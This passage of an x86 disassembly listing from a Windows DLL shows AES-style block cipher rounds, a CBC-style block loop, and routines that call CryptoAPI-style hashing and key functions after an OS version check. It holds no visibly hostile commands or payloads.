10009948:	33 14 b5 48 21 01 10 	xor    0x10012148(,%esi,4),%edx
1000994f:	8b 75 f8             	mov    -0x8(%ebp),%esi
10009952:	23 d8                	and    %eax,%ebx
10009954:	33 3c 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edi
1000995b:	23 f0                	and    %eax,%esi
1000995d:	33 14 b5 48 2d 01 10 	xor    0x10012d48(,%esi,4),%edx
10009964:	33 79 08             	xor    0x8(%ecx),%edi
10009967:	33 51 0c             	xor    0xc(%ecx),%edx
1000996a:	8b f7                	mov    %edi,%esi
1000996c:	c1 ee 10             	shr    $0x10,%esi
1000996f:	23 f0                	and    %eax,%esi
10009971:	0f b6 b6 20 10 01 10 	movzbl 0x10011020(%esi),%esi
10009978:	8b da                	mov    %edx,%ebx
1000997a:	c1 eb 18             	shr    $0x18,%ebx
1000997d:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009984:	c1 e3 08             	shl    $0x8,%ebx
10009987:	33 f3                	xor    %ebx,%esi
10009989:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000998c:	c1 eb 08             	shr    $0x8,%ebx
1000998f:	23 d8                	and    %eax,%ebx
10009991:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009998:	c1 e6 08             	shl    $0x8,%esi
1000999b:	33 f3                	xor    %ebx,%esi
1000999d:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100099a0:	23 d8                	and    %eax,%ebx
100099a2:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
100099a9:	c1 e6 08             	shl    $0x8,%esi
100099ac:	33 f3                	xor    %ebx,%esi
100099ae:	33 71 10             	xor    0x10(%ecx),%esi
100099b1:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100099b4:	89 75 f0             	mov    %esi,-0x10(%ebp)
100099b7:	c1 eb 18             	shr    $0x18,%ebx
100099ba:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
100099c1:	c1 e3 08             	shl    $0x8,%ebx
100099c4:	8b f2                	mov    %edx,%esi
100099c6:	c1 ee 10             	shr    $0x10,%esi
100099c9:	23 f0                	and    %eax,%esi
100099cb:	0f b6 b6 20 10 01 10 	movzbl 0x10011020(%esi),%esi
100099d2:	33 f3                	xor    %ebx,%esi
100099d4:	c1 e6 08             	shl    $0x8,%esi
100099d7:	8b df                	mov    %edi,%ebx
100099d9:	c1 eb 08             	shr    $0x8,%ebx
100099dc:	23 d8                	and    %eax,%ebx
100099de:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
100099e5:	33 f3                	xor    %ebx,%esi
100099e7:	8b 5d 08             	mov    0x8(%ebp),%ebx
100099ea:	c1 e6 08             	shl    $0x8,%esi
100099ed:	23 d8                	and    %eax,%ebx
100099ef:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
100099f6:	33 f3                	xor    %ebx,%esi
100099f8:	33 71 14             	xor    0x14(%ecx),%esi
100099fb:	8b 5d 08             	mov    0x8(%ebp),%ebx
100099fe:	89 75 f4             	mov    %esi,-0xc(%ebp)
10009a01:	8b 75 0c             	mov    0xc(%ebp),%esi
10009a04:	c1 ee 10             	shr    $0x10,%esi
10009a07:	23 f0                	and    %eax,%esi
10009a09:	0f b6 b6 20 10 01 10 	movzbl 0x10011020(%esi),%esi
10009a10:	c1 eb 18             	shr    $0x18,%ebx
10009a13:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009a1a:	c1 e3 08             	shl    $0x8,%ebx
10009a1d:	33 f3                	xor    %ebx,%esi
10009a1f:	c1 e6 08             	shl    $0x8,%esi
10009a22:	8b da                	mov    %edx,%ebx
10009a24:	c1 eb 08             	shr    $0x8,%ebx
10009a27:	23 d8                	and    %eax,%ebx
10009a29:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009a30:	33 f3                	xor    %ebx,%esi
10009a32:	8b df                	mov    %edi,%ebx
10009a34:	c1 e6 08             	shl    $0x8,%esi
10009a37:	23 d8                	and    %eax,%ebx
10009a39:	0f b6 9b 20 10 01 10 	movzbl 0x10011020(%ebx),%ebx
10009a40:	33 f3                	xor    %ebx,%esi
10009a42:	33 71 18             	xor    0x18(%ecx),%esi
10009a45:	c1 ef 18             	shr    $0x18,%edi
10009a48:	0f b6 bf 20 10 01 10 	movzbl 0x10011020(%edi),%edi
10009a4f:	89 75 fc             	mov    %esi,-0x4(%ebp)
10009a52:	8b 75 08             	mov    0x8(%ebp),%esi
10009a55:	c1 ee 10             	shr    $0x10,%esi
10009a58:	23 f0                	and    %eax,%esi
10009a5a:	0f b6 b6 20 10 01 10 	movzbl 0x10011020(%esi),%esi
10009a61:	c1 e7 08             	shl    $0x8,%edi
10009a64:	33 f7                	xor    %edi,%esi
10009a66:	8b 7d 0c             	mov    0xc(%ebp),%edi
10009a69:	c1 ef 08             	shr    $0x8,%edi
10009a6c:	23 f8                	and    %eax,%edi
10009a6e:	0f b6 bf 20 10 01 10 	movzbl 0x10011020(%edi),%edi
10009a75:	c1 e6 08             	shl    $0x8,%esi
10009a78:	23 d0                	and    %eax,%edx
10009a7a:	0f b6 82 20 10 01 10 	movzbl 0x10011020(%edx),%eax
10009a81:	33 f7                	xor    %edi,%esi
10009a83:	c1 e6 08             	shl    $0x8,%esi
10009a86:	33 f0                	xor    %eax,%esi
10009a88:	33 71 1c             	xor    0x1c(%ecx),%esi
10009a8b:	89 75 f8             	mov    %esi,-0x8(%ebp)
10009a8e:	8b d6                	mov    %esi,%edx
10009a90:	8b 45 10             	mov    0x10(%ebp),%eax
10009a93:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10009a96:	8b d9                	mov    %ecx,%ebx
10009a98:	c1 eb 08             	shr    $0x8,%ebx
10009a9b:	88 58 01             	mov    %bl,0x1(%eax)
10009a9e:	88 08                	mov    %cl,(%eax)
10009aa0:	8b d9                	mov    %ecx,%ebx
10009aa2:	c1 e9 18             	shr    $0x18,%ecx
10009aa5:	c1 eb 10             	shr    $0x10,%ebx
10009aa8:	88 48 03             	mov    %cl,0x3(%eax)
10009aab:	8b 4d f4             	mov    -0xc(%ebp),%ecx
10009aae:	88 58 02             	mov    %bl,0x2(%eax)
10009ab1:	8b d9                	mov    %ecx,%ebx
10009ab3:	c1 eb 08             	shr    $0x8,%ebx
10009ab6:	88 58 05             	mov    %bl,0x5(%eax)
10009ab9:	88 48 04             	mov    %cl,0x4(%eax)
10009abc:	8b d9                	mov    %ecx,%ebx
10009abe:	c1 e9 18             	shr    $0x18,%ecx
10009ac1:	c1 eb 10             	shr    $0x10,%ebx
10009ac4:	88 48 07             	mov    %cl,0x7(%eax)
10009ac7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10009aca:	88 58 06             	mov    %bl,0x6(%eax)
10009acd:	8b d9                	mov    %ecx,%ebx
10009acf:	c1 eb 08             	shr    $0x8,%ebx
10009ad2:	88 48 08             	mov    %cl,0x8(%eax)
10009ad5:	88 58 09             	mov    %bl,0x9(%eax)
10009ad8:	8b d9                	mov    %ecx,%ebx
10009ada:	c1 e9 18             	shr    $0x18,%ecx
10009add:	88 48 0b             	mov    %cl,0xb(%eax)
10009ae0:	8b ca                	mov    %edx,%ecx
10009ae2:	c1 e9 08             	shr    $0x8,%ecx
10009ae5:	88 48 0d             	mov    %cl,0xd(%eax)
10009ae8:	8b ca                	mov    %edx,%ecx
10009aea:	c1 eb 10             	shr    $0x10,%ebx
10009aed:	88 50 0c             	mov    %dl,0xc(%eax)
10009af0:	5f                   	pop    %edi
10009af1:	c1 e9 10             	shr    $0x10,%ecx
10009af4:	c1 ea 18             	shr    $0x18,%edx
10009af7:	88 58 0a             	mov    %bl,0xa(%eax)
10009afa:	5e                   	pop    %esi
10009afb:	88 48 0e             	mov    %cl,0xe(%eax)
10009afe:	88 50 0f             	mov    %dl,0xf(%eax)
10009b01:	33 c0                	xor    %eax,%eax
10009b03:	5b                   	pop    %ebx
10009b04:	c9                   	leave  
10009b05:	c3                   	ret    
10009b06:	55                   	push   %ebp
10009b07:	8b ec                	mov    %esp,%ebp
10009b09:	83 ec 18             	sub    $0x18,%esp
10009b0c:	f6 c1 0f             	test   $0xf,%cl
10009b0f:	74 05                	je     0x10009b16
10009b11:	6a de                	push   $0xffffffde
10009b13:	58                   	pop    %eax
10009b14:	c9                   	leave  
10009b15:	c3                   	ret    
10009b16:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
10009b1a:	53                   	push   %ebx
10009b1b:	56                   	push   %esi
10009b1c:	57                   	push   %edi
10009b1d:	75 66                	jne    0x10009b85
10009b1f:	85 c9                	test   %ecx,%ecx
10009b21:	0f 84 b3 00 00 00    	je     0x10009bda
10009b27:	8b 45 14             	mov    0x14(%ebp),%eax
10009b2a:	89 45 fc             	mov    %eax,-0x4(%ebp)
10009b2d:	8b 45 10             	mov    0x10(%ebp),%eax
10009b30:	2b 45 18             	sub    0x18(%ebp),%eax
10009b33:	8d 59 ff             	lea    -0x1(%ecx),%ebx
10009b36:	c1 eb 04             	shr    $0x4,%ebx
10009b39:	89 45 f8             	mov    %eax,-0x8(%ebp)
10009b3c:	43                   	inc    %ebx
10009b3d:	8b 45 fc             	mov    -0x4(%ebp),%eax
10009b40:	ff 75 18             	pushl  0x18(%ebp)
10009b43:	8b f0                	mov    %eax,%esi
10009b45:	8d 7d e8             	lea    -0x18(%ebp),%edi
10009b48:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b49:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b4a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b4b:	6a 00                	push   $0x0
10009b4d:	ff 75 08             	pushl  0x8(%ebp)
10009b50:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b51:	e8 94 f6 ff ff       	call   0x100091ea
10009b56:	8b 45 18             	mov    0x18(%ebp),%eax
10009b59:	83 c4 0c             	add    $0xc,%esp
10009b5c:	6a 10                	push   $0x10
10009b5e:	5e                   	pop    %esi
10009b5f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
10009b62:	8a 0c 01             	mov    (%ecx,%eax,1),%cl
10009b65:	30 08                	xor    %cl,(%eax)
10009b67:	40                   	inc    %eax
10009b68:	4e                   	dec    %esi
10009b69:	75 f4                	jne    0x10009b5f
10009b6b:	8b 7d 10             	mov    0x10(%ebp),%edi
10009b6e:	83 45 fc 10          	addl   $0x10,-0x4(%ebp)
10009b72:	83 6d f8 10          	subl   $0x10,-0x8(%ebp)
10009b76:	4b                   	dec    %ebx
10009b77:	8d 75 e8             	lea    -0x18(%ebp),%esi
10009b7a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b7b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b7c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b7d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009b7e:	89 45 18             	mov    %eax,0x18(%ebp)
10009b81:	75 ba                	jne    0x10009b3d
10009b83:	eb 55                	jmp    0x10009bda
10009b85:	85 c9                	test   %ecx,%ecx
10009b87:	74 51                	je     0x10009bda
10009b89:	8b 5d 10             	mov    0x10(%ebp),%ebx
10009b8c:	2b 5d 14             	sub    0x14(%ebp),%ebx
10009b8f:	8d 41 ff             	lea    -0x1(%ecx),%eax
10009b92:	c1 e8 04             	shr    $0x4,%eax
10009b95:	40                   	inc    %eax
10009b96:	89 45 f8             	mov    %eax,-0x8(%ebp)
10009b99:	8b 75 18             	mov    0x18(%ebp),%esi
10009b9c:	8b 45 14             	mov    0x14(%ebp),%eax
10009b9f:	8b fe                	mov    %esi,%edi
10009ba1:	6a 10                	push   $0x10
10009ba3:	2b f8                	sub    %eax,%edi
10009ba5:	59                   	pop    %ecx
10009ba6:	8a 14 03             	mov    (%ebx,%eax,1),%dl
10009ba9:	32 10                	xor    (%eax),%dl
10009bab:	88 14 07             	mov    %dl,(%edi,%eax,1)
10009bae:	40                   	inc    %eax
10009baf:	49                   	dec    %ecx
10009bb0:	75 f4                	jne    0x10009ba6
10009bb2:	56                   	push   %esi
10009bb3:	ff 75 0c             	pushl  0xc(%ebp)
10009bb6:	8b c6                	mov    %esi,%eax
10009bb8:	ff 75 08             	pushl  0x8(%ebp)
10009bbb:	e8 2a f6 ff ff       	call   0x100091ea
10009bc0:	8b 7d 10             	mov    0x10(%ebp),%edi
10009bc3:	83 45 14 10          	addl   $0x10,0x14(%ebp)
10009bc7:	83 45 18 10          	addl   $0x10,0x18(%ebp)
10009bcb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009bcc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009bcd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009bce:	83 c4 0c             	add    $0xc,%esp
10009bd1:	83 eb 10             	sub    $0x10,%ebx
10009bd4:	ff 4d f8             	decl   -0x8(%ebp)
10009bd7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10009bd8:	75 bf                	jne    0x10009b99
10009bda:	5f                   	pop    %edi
10009bdb:	5e                   	pop    %esi
10009bdc:	33 c0                	xor    %eax,%eax
10009bde:	5b                   	pop    %ebx
10009bdf:	c9                   	leave  
10009be0:	c3                   	ret    
10009be1:	55                   	push   %ebp
10009be2:	8b ec                	mov    %esp,%ebp
10009be4:	83 ec 18             	sub    $0x18,%esp
10009be7:	53                   	push   %ebx
10009be8:	8b 1d 50 e0 00 10    	mov    0x1000e050,%ebx
10009bee:	56                   	push   %esi
10009bef:	57                   	push   %edi
10009bf0:	8b 38                	mov    (%eax),%edi
10009bf2:	68 00 00 00 f0       	push   $0xf0000000
10009bf7:	33 f6                	xor    %esi,%esi
10009bf9:	8d 50 04             	lea    0x4(%eax),%edx
10009bfc:	6a 01                	push   $0x1
10009bfe:	8d 44 07 04          	lea    0x4(%edi,%eax,1),%eax
10009c02:	56                   	push   %esi
10009c03:	89 45 e8             	mov    %eax,-0x18(%ebp)
10009c06:	2b cf                	sub    %edi,%ecx
10009c08:	56                   	push   %esi
10009c09:	8d 45 fc             	lea    -0x4(%ebp),%eax
10009c0c:	83 e9 04             	sub    $0x4,%ecx
10009c0f:	50                   	push   %eax
10009c10:	89 75 fc             	mov    %esi,-0x4(%ebp)
10009c13:	89 75 f4             	mov    %esi,-0xc(%ebp)
10009c16:	89 55 f0             	mov    %edx,-0x10(%ebp)
10009c19:	89 4d ec             	mov    %ecx,-0x14(%ebp)
10009c1c:	ff d3                	call   *%ebx
10009c1e:	85 c0                	test   %eax,%eax
10009c20:	75 2a                	jne    0x10009c4c
10009c22:	ff 15 4c e1 00 10    	call   *0x1000e14c
10009c28:	ff 15 4c e1 00 10    	call   *0x1000e14c
10009c2e:	3d 16 00 09 80       	cmp    $0x80090016,%eax
10009c33:	75 13                	jne    0x10009c48
10009c35:	68 08 00 00 f0       	push   $0xf0000008
10009c3a:	6a 01                	push   $0x1
10009c3c:	56                   	push   %esi
10009c3d:	56                   	push   %esi
10009c3e:	8d 45 fc             	lea    -0x4(%ebp),%eax
10009c41:	50                   	push   %eax
10009c42:	ff d3                	call   *%ebx
10009c44:	85 c0                	test   %eax,%eax
10009c46:	75 04                	jne    0x10009c4c
10009c48:	33 c0                	xor    %eax,%eax
10009c4a:	eb 7c                	jmp    0x10009cc8
10009c4c:	8d 45 f4             	lea    -0xc(%ebp),%eax
10009c4f:	50                   	push   %eax
10009c50:	56                   	push   %esi
10009c51:	56                   	push   %esi
10009c52:	ff 75 0c             	pushl  0xc(%ebp)
10009c55:	33 db                	xor    %ebx,%ebx
10009c57:	ff 75 08             	pushl  0x8(%ebp)
10009c5a:	ff 75 fc             	pushl  -0x4(%ebp)
10009c5d:	ff 15 18 e0 00 10    	call   *0x1000e018
10009c63:	85 c0                	test   %eax,%eax
10009c65:	74 55                	je     0x10009cbc
10009c67:	8d 45 f8             	lea    -0x8(%ebp),%eax
10009c6a:	50                   	push   %eax
10009c6b:	56                   	push   %esi
10009c6c:	56                   	push   %esi
10009c6d:	68 04 80 00 00       	push   $0x8004
10009c72:	ff 75 fc             	pushl  -0x4(%ebp)
10009c75:	89 75 f8             	mov    %esi,-0x8(%ebp)
10009c78:	ff 15 34 e0 00 10    	call   *0x1000e034
10009c7e:	85 c0                	test   %eax,%eax
10009c80:	74 31                	je     0x10009cb3
10009c82:	56                   	push   %esi
10009c83:	57                   	push   %edi
10009c84:	ff 75 f0             	pushl  -0x10(%ebp)
10009c87:	ff 75 f8             	pushl  -0x8(%ebp)
10009c8a:	ff 15 20 e0 00 10    	call   *0x1000e020
10009c90:	85 c0                	test   %eax,%eax
10009c92:	74 16                	je     0x10009caa
10009c94:	56                   	push   %esi
10009c95:	56                   	push   %esi
10009c96:	ff 75 f4             	pushl  -0xc(%ebp)
10009c99:	ff 75 ec             	pushl  -0x14(%ebp)
10009c9c:	ff 75 e8             	pushl  -0x18(%ebp)
10009c9f:	ff 75 f8             	pushl  -0x8(%ebp)
10009ca2:	ff 15 1c e0 00 10    	call   *0x1000e01c
10009ca8:	8b d8                	mov    %eax,%ebx
10009caa:	ff 75 f8             	pushl  -0x8(%ebp)
10009cad:	ff 15 2c e0 00 10    	call   *0x1000e02c
10009cb3:	ff 75 f4             	pushl  -0xc(%ebp)
10009cb6:	ff 15 14 e0 00 10    	call   *0x1000e014
10009cbc:	56                   	push   %esi
10009cbd:	ff 75 fc             	pushl  -0x4(%ebp)
10009cc0:	ff 15 00 e0 00 10    	call   *0x1000e000
10009cc6:	8b c3                	mov    %ebx,%eax
10009cc8:	5f                   	pop    %edi
10009cc9:	5e                   	pop    %esi
10009cca:	5b                   	pop    %ebx
10009ccb:	c9                   	leave  
10009ccc:	c3                   	ret    
10009ccd:	55                   	push   %ebp
10009cce:	8b ec                	mov    %esp,%ebp
10009cd0:	83 ec 24             	sub    $0x24,%esp
10009cd3:	e8 55 be ff ff       	call   0x10005b2d
10009cd8:	3d b0 1d 00 00       	cmp    $0x1db0,%eax
10009cdd:	73 05                	jae    0x10009ce4
10009cdf:	33 c0                	xor    %eax,%eax
10009ce1:	40                   	inc    %eax
10009ce2:	c9                   	leave  
10009ce3:	c3                   	ret    
10009ce4:	53                   	push   %ebx
10009ce5:	56                   	push   %esi
10009ce6:	33 f6                	xor    %esi,%esi
10009ce8:	83 7d 0c 64          	cmpl   $0x64,0xc(%ebp)
10009cec:	89 75 dc             	mov    %esi,-0x24(%ebp)
10009cef:	89 75 f0             	mov    %esi,-0x10(%ebp)
10009cf2:	89 75 fc             	mov    %esi,-0x4(%ebp)
10009cf5:	b8 24 ec 00 10       	mov    $0x1000ec24,%eax
10009cfa:	bb 34 ec 00 10       	mov    $0x1000ec34,%ebx
10009cff:	73 0a                	jae    0x10009d0b
10009d01:	b8 4c ec 00 10       	mov    $0x1000ec4c,%eax
10009d06:	bb 5c ec 00 10       	mov    $0x1000ec5c,%ebx
10009d0b:	57                   	push   %edi
10009d0c:	8b 3d 94 e2 00 10    	mov    0x1000e294,%edi
10009d12:	56                   	push   %esi
10009d13:	56                   	push   %esi
10009d14:	50                   	push   %eax
10009d15:	8d 45 fc             	lea    -0x4(%ebp),%eax
10009d18:	50                   	push   %eax
10009d19:	ff d7                	call   *%edi
10009d1b:	85 c0                	test   %eax,%eax
10009d1d:	74 07                	je     0x10009d26
10009d1f:	33 c0                	xor    %eax,%eax
10009d21:	e9 5a 01 00 00       	jmp    0x10009e80
10009d26:	56                   	push   %esi
10009d27:	56                   	push   %esi
10009d28:	53                   	push   %ebx
10009d29:	8d 45 f0             	lea    -0x10(%ebp),%eax
10009d2c:	50                   	push   %eax
10009d2d:	ff d7                	call   *%edi
10009d2f:	85 c0                	test   %eax,%eax
10009d31:	0f 85 f2 00 00 00    	jne    0x10009e29
10009d37:	56                   	push   %esi
10009d38:	ff 75 0c             	pushl  0xc(%ebp)
10009d3b:	8d 45 ec             	lea    -0x14(%ebp),%eax
10009d3e:	ff 75 08             	pushl  0x8(%ebp)
10009d41:	89 75 ec             	mov    %esi,-0x14(%ebp)
10009d44:	50                   	push   %eax
10009d45:	68 74 ec 00 10       	push   $0x1000ec74
10009d4a:	56                   	push   %esi
10009d4b:	ff 75 f0             	pushl  -0x10(%ebp)
10009d4e:	ff 15 ac e2 00 10    	call   *0x1000e2ac
10009d54:	85 c0                	test   %eax,%eax
10009d56:	0f 85 cd 00 00 00    	jne    0x10009e29
10009d5c:	8b 3d b4 e2 00 10    	mov    0x1000e2b4,%edi
10009d62:	56                   	push   %esi
10009d63:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10009d66:	50                   	push   %eax
10009d67:	6a 04                	push   $0x4
10009d69:	8d 45 e8             	lea    -0x18(%ebp),%eax
10009d6c:	50                   	push   %eax
10009d6d:	68 90 ec 00 10       	push   $0x1000ec90
10009d72:	ff 75 fc             	pushl  -0x4(%ebp)
10009d75:	89 75 e8             	mov    %esi,-0x18(%ebp)
10009d78:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10009d7b:	89 75 f4             	mov    %esi,-0xc(%ebp)
10009d7e:	ff d7                	call   *%edi
10009d80:	85 c0                	test   %eax,%eax
10009d82:	0f 85 a1 00 00 00    	jne    0x10009e29
10009d88:	ff 75 e8             	pushl  -0x18(%ebp)
10009d8b:	e8 54 cc ff ff       	call   0x100069e4
10009d90:	8b d8                	mov    %eax,%ebx
10009d92:	59                   	pop    %ecx
10009d93:	3b de                	cmp    %esi,%ebx
10009d95:	0f 84 91 00 00 00    	je     0x10009e2c
10009d9b:	56                   	push   %esi
10009d9c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10009d9f:	50                   	push   %eax
10009da0:	6a 04                	push   $0x4
10009da2:	8d 45 f4             	lea    -0xc(%ebp),%eax
10009da5:	50                   	push   %eax
10009da6:	68 ac ec 00 10       	push   $0x1000ecac
10009dab:	ff 75 fc             	pushl  -0x4(%ebp)
10009dae:	ff d7                	call   *%edi
10009db0:	85 c0                	test   %eax,%eax
10009db2:	75 78                	jne    0x10009e2c
10009db4:	ff 75 f4             	pushl  -0xc(%ebp)
10009db7:	e8 28 cc ff ff       	call   0x100069e4
10009dbc:	8b f8                	mov    %eax,%edi
10009dbe:	59                   	pop    %ecx
10009dbf:	89 7d e0             	mov    %edi,-0x20(%ebp)
10009dc2:	3b fe                	cmp    %esi,%edi
10009dc4:	74 66                	je     0x10009e2c
10009dc6:	56                   	push   %esi
10009dc7:	56                   	push   %esi
10009dc8:	56                   	push   %esi
10009dc9:	ff 75 e8             	pushl  -0x18(%ebp)
10009dcc:	8d 45 f8             	lea    -0x8(%ebp),%eax
10009dcf:	53                   	push   %ebx
10009dd0:	50                   	push   %eax
10009dd1:	ff 75 fc             	pushl  -0x4(%ebp)
10009dd4:	89 75 f8             	mov    %esi,-0x8(%ebp)
10009dd7:	ff 15 b8 e2 00 10    	call   *0x1000e2b8
10009ddd:	85 c0                	test   %eax,%eax
10009ddf:	75 4b                	jne    0x10009e2c
10009de1:	56                   	push   %esi
10009de2:	ff 75 14             	pushl  0x14(%ebp)
10009de5:	ff 75 10             	pushl  0x10(%ebp)
10009de8:	ff 75 f8             	pushl  -0x8(%ebp)
10009deb:	ff 15 9c e2 00 10    	call   *0x1000e29c
10009df1:	85 c0                	test   %eax,%eax
10009df3:	75 37                	jne    0x10009e2c
10009df5:	56                   	push   %esi
10009df6:	ff 75 f4             	pushl  -0xc(%ebp)
10009df9:	57                   	push   %edi
10009dfa:	ff 75 f8             	pushl  -0x8(%ebp)
10009dfd:	ff 15 a0 e2 00 10    	call   *0x1000e2a0
10009e03:	85 c0                	test   %eax,%eax
10009e05:	75 25                	jne    0x10009e2c
10009e07:	56                   	push   %esi
10009e08:	ff 75 1c             	pushl  0x1c(%ebp)
10009e0b:	ff 75 18             	pushl  0x18(%ebp)
10009e0e:	ff 75 f4             	pushl  -0xc(%ebp)
10009e11:	57                   	push   %edi
10009e12:	56                   	push   %esi
10009e13:	ff 75 ec             	pushl  -0x14(%ebp)
10009e16:	ff 15 a4 e2 00 10    	call   *0x1000e2a4
10009e1c:	85 c0                	test   %eax,%eax
10009e1e:	75 0c                	jne    0x10009e2c
10009e20:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
10009e27:	eb 03                	jmp    0x10009e2c
10009e29:	8b 5d dc             	mov    -0x24(%ebp),%ebx
10009e2c:	8b 3d a8 e2 00 10    	mov    0x1000e2a8,%edi
10009e32:	39 75 fc             	cmp    %esi,-0x4(%ebp)
10009e35:	74 06                	je     0x10009e3d
10009e37:	56                   	push   %esi
10009e38:	ff 75 fc             	pushl  -0x4(%ebp)
10009e3b:	ff d7                	call   *%edi
10009e3d:	39 75 f0             	cmp    %esi,-0x10(%ebp)
10009e40:	74 06                	je     0x10009e48
10009e42:	56                   	push   %esi
10009e43:	ff 75 f0             	pushl  -0x10(%ebp)
10009e46:	ff d7                	call   *%edi
10009e48:	39 75 ec             	cmp    %esi,-0x14(%ebp)
10009e4b:	74 09                	je     0x10009e56
10009e4d:	ff 75 ec             	pushl  -0x14(%ebp)
10009e50:	ff 15 b0 e2 00 10    	call   *0x1000e2b0
10009e56:	39 75 f8             	cmp    %esi,-0x8(%ebp)
10009e59:	74 09                	je     0x10009e64
10009e5b:	ff 75 f8             	pushl  -0x8(%ebp)
10009e5e:	ff 15 98 e2 00 10    	call   *0x1000e298
10009e64:	3b de                	cmp    %esi,%ebx
10009e66:	74 07                	je     0x10009e6f
10009e68:	53                   	push   %ebx
10009e69:	e8 a5 cb ff ff       	call   0x10006a13
10009e6e:	59                   	pop    %ecx
10009e6f:	39 75 e0             	cmp    %esi,-0x20(%ebp)
10009e72:	74 09                	je     0x10009e7d
10009e74:	ff 75 e0             	pushl  -0x20(%ebp)
10009e77:	e8 97 cb ff ff       	call   0x10006a13
10009e7c:	59                   	pop    %ecx
10009e7d:	8b 45 dc             	mov    -0x24(%ebp),%eax
10009e80:	5f                   	pop    %edi
10009e81:	5e                   	pop    %esi
10009e82:	5b                   	pop    %ebx
10009e83:	c9                   	leave  
10009e84:	c3                   	ret    
10009e85:	55                   	push   %ebp
10009e86:	8b ec                	mov    %esp,%ebp
10009e88:	8b 11                	mov    (%ecx),%edx
10009e8a:	56                   	push   %esi
10009e8b:	8d 70 e6             	lea    -0x1a(%eax),%esi
10009e8e:	3b d6                	cmp    %esi,%edx
10009e90:	5e                   	pop    %esi
10009e91:	76 04                	jbe    0x10009e97
10009e93:	33 c0                	xor    %eax,%eax
10009e95:	5d                   	pop    %ebp
10009e96:	c3                   	ret    
10009e97:	2b c2                	sub    %edx,%eax
10009e99:	83 e8 04             	sub    $0x4,%eax
10009e9c:	50                   	push   %eax
10009e9d:	8d 44 0a 04          	lea    0x4(%edx,%ecx,1),%eax
10009ea1:	50                   	push   %eax
10009ea2:	52                   	push   %edx
10009ea3:	83 c1 04             	add    $0x4,%ecx
10009ea6:	51                   	push   %ecx
10009ea7:	ff 75 0c             	pushl  0xc(%ebp)
10009eaa:	ff 75 08             	pushl  0x8(%ebp)
10009ead:	e8 1b fe ff ff       	call   0x10009ccd
10009eb2:	83 c4 18             	add    $0x18,%esp
10009eb5:	5d                   	pop    %ebp
10009eb6:	c3                   	ret    
10009eb7:	55                   	push   %ebp
10009eb8:	8b ec                	mov    %esp,%ebp
10009eba:	8b 55 08             	mov    0x8(%ebp),%edx
10009ebd:	56                   	push   %esi
10009ebe:	6a 07                	push   $0x7
10009ec0:	5e                   	pop    %esi
10009ec1:	8b ca                	mov    %edx,%ecx
10009ec3:	e8 29 00 00 00       	call   0x10009ef1
10009ec8:	83 c2 3c             	add    $0x3c,%edx
10009ecb:	4e                   	dec    %esi
10009ecc:	79 f3                	jns    0x10009ec1
10009ece:	8b 45 08             	mov    0x8(%ebp),%eax
10009ed1:	5e                   	pop    %esi
10009ed2:	5d                   	pop    %ebp
10009ed3:	c2 04 00             	ret    $0x4
10009ed6:	56                   	push   %esi
10009ed7:	57                   	push   %edi
10009ed8:	6a 07                	push   $0x7
10009eda:	8d b0 e0 01 00 00    	lea    0x1e0(%eax),%esi
10009ee0:	5f                   	pop    %edi
10009ee1:	83 ee 3c             	sub    $0x3c,%esi
10009ee4:	8b ce                	mov    %esi,%ecx
10009ee6:	e8 14 00 00 00       	call   0x10009eff
10009eeb:	4f                   	dec    %edi
10009eec:	79 f3                	jns    0x10009ee1
10009eee:	5f                   	pop    %edi
10009eef:	5e                   	pop    %esi
10009ef0:	c3                   	ret    
10009ef1:	8b c1                	mov    %ecx,%eax
10009ef3:	33 c9                	xor    %ecx,%ecx
10009ef5:	89 48 38             	mov    %ecx,0x38(%eax)
10009ef8:	89 48 30             	mov    %ecx,0x30(%eax)
10009efb:	89 48 34             	mov    %ecx,0x34(%eax)
10009efe:	c3                   	ret    
10009eff:	56                   	push   %esi
10009f00:	8b f1                	mov    %ecx,%esi
10009f02:	e8 53 01 00 00       	call   0x1000a05a
10009f07:	5e                   	pop    %esi
10009f08:	c3                   	ret    
10009f09:	55                   	push   %ebp
10009f0a:	8b ec                	mov    %esp,%ebp
10009f0c:	56                   	push   %esi
10009f0d:	8b f1                	mov    %ecx,%esi
10009f0f:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
10009f13:	57                   	push   %edi
10009f14:	8b f8                	mov    %eax,%edi
10009f16:	74 05                	je     0x10009f1d
10009f18:	e8 3d 01 00 00       	call   0x1000a05a
10009f1d:	8b c7                	mov    %edi,%eax
10009f1f:	83 e0 f0             	and    $0xfffffff0,%eax
10009f22:	83 c0 10             	add    $0x10,%eax
10009f25:	50                   	push   %eax
10009f26:	89 46 34             	mov    %eax,0x34(%esi)
